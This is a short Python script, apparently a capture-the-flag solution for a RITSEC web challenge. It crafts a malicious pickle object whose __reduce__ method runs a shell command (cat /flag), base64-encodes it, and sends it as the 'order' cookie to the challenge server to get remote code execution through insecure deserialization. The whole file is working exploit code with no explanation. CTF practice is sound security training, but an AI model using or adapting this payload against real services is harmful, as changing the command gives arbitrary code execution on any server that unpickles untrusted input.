import pickle
import base64
import requests
import subprocess


class PickleRCE(object):
    def __reduce__(self):
        cmd = ["cat", "/flag"]
        return (subprocess.check_output,(cmd,))

payload = base64.b64encode(pickle.dumps(PickleRCE()))  # Crafting payload
r = requests.get("https://pickles-web.challenges.ctf.ritsec.club/order", cookies={"order":payload.decode()})  # Send GET request
print(r.text)